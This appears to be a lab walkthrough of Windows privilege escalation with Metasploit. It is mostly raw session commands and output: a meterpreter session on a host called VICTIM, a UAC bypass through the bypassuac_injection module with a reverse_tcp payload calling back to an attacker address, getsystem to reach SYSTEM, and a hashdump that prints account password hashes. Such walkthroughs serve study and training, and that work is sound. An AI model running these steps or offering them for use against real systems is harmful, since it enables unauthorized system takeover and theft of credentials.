
# We observe we have a user named admin however the privileges are low

meterpreter > `sysinfo`
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >` getuid`
Server username: VICTIM\admin
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 

# Lets first try to elevate using `getsystem`, but we observe this didnt worked

meterpreter > `getsystem`
[-] 2001: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)

# Lets check if the user is part of `Localgroup administrators`, we see yes admin is part of it, which means this user can administrative task after approving the UAC prompt

eterpreter > `shell`
Process 2824 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>`net users  `   
net users

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>`net localgroup administrators`
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

# So We saw that user can be used to elevate privilage by bypassing UAC, We will use `In Memory Injection` metasploit module to to do this

msf6 exploit(windows/http/rejetto_hfs_exec) > `sessions`

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  VICTIM\admin @ VICTIM  10.10.12.2:4444 -> 10.5.28.165:49210 (10.5.28.165)

msf6 exploit(windows/http/rejetto_hfs_exec) > 

# We see there are many bypassUAC modules taht utilise diffrent techniques to elevate privileges but we will be using the `In Memory Injection`, it will execute the meterpreter payload in memeory

msf6 exploit(windows/http/rejetto_hfs_exec) > `search bypassuac`

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2   exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   3   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   4   exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   6   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   7   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   8   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   9   exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   10  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   11  exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   12  exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/local/bypassuac_windows_store_reg

msf6 exploit(windows/http/rejetto_hfs_exec) > 

# We will be using `exploit/windows/local/bypassuac_injection `, its by default using 32 bit payload which we can change, also LPORT 4444 is already in use so change it as well

msf6 exploit(windows/http/rejetto_hfs_exec) > `use exploit/windows/local/bypassuac_injection `
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > `set payload windows/x64/meterpreter/reverse_tcp`
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > `options`

Module options (exploit/windows/local/bypassuac_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac_injection) > `set SESSION 1`
SESSION => 1
msf6 exploit(windows/local/bypassuac_injection) > `set LPORT 1234`
LPORT => 1234
msf6 exploit(windows/local/bypassuac_injection) > `run`

[*] Started reverse TCP handler on 10.10.12.2:1234 
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[-] Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac_injection) > 

# We got an errror `failure: bad-config: x86 Target Selected for x64 System` , lets change the target

msf6 exploit(windows/local/bypassuac_injection) > `set TARGET Windows\ x64 `
TARGET => Windows x64
msf6 exploit(windows/local/bypassuac_injection) > `run`

[*] Started reverse TCP handler on 10.10.12.2:1234 
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 916
[*] Sending stage (200262 bytes) to 10.5.28.165
[*] Meterpreter session 2 opened (10.10.12.2:1234 -> 10.5.28.165:49276) at 2024-01-10 10:25:33 +0530

meterpreter > `getuid`
Server username: VICTIM\admin

# The reasone we still have `VICTIM\admin` because this exploit simply disables the UAC for this user so now if we use `getsystem` we can see we have elevatred our privileges successfully

meterpreter > `getsystem`
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

# We can now execute almost any commands without providing any password or credentials or approval, For example we dump the hashes

meterpreter > `hashdump`
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
